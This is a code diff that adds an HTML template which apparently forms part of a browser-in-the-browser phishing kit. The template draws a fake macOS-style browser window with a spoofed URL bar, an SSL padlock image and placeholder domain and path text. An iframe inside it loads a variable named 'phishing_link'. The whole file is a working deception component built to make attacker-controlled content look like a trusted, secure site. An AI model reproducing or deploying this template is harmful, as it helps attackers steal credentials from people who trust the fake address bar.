@@ -1,0 +1,21 @@
+<div id="window" name="{{ type }}" style="margin:auto; position: absolute; bottom: 2.5%; display: none; top: 100px; left: 25%;">
+    <!-- Title bar start -->
+    <div id="title-bar-width">
+        <div id="title-bar" class="outer yosemite">
+            <span class="dots">
+             <div id="exit" class="dot red"></div>
+             <div id="minimize" class="dot amber"></div>
+             <div id="maximize" class="dot green"></div>
+            </span>
+    
+             <span id="logo-description">{{ title }}</span>
+        </div>
+        <div id="url-bar">
+            <img src="static/images/ssl.svg" width="20px" height="20px" id="ssl-padlock">
+            <span id="domain-name">{{ domain }}</span>
+            <span id="domain-path">{{ path }}</span>
+        </div>
+    </div>
+    <!-- Content start -->
+    <iframe id="content" src="{{ phishing_link }}" frameBorder="0"></iframe>
+    </div>
